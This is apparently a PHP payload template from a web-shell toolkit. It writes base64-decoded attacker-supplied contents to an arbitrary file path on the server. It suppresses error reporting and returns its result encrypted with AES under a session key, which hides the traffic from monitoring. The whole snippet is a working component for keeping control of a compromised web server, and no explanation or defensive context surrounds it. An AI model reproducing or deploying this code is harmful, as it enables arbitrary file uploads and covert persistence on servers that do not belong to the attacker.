
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();
$file = base64_decode('__FILE__');
$data = array(
    "file" => $file,
    "status" => file_put_contents($file, base64_decode('__CONTENTS__')) !== false,
);
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
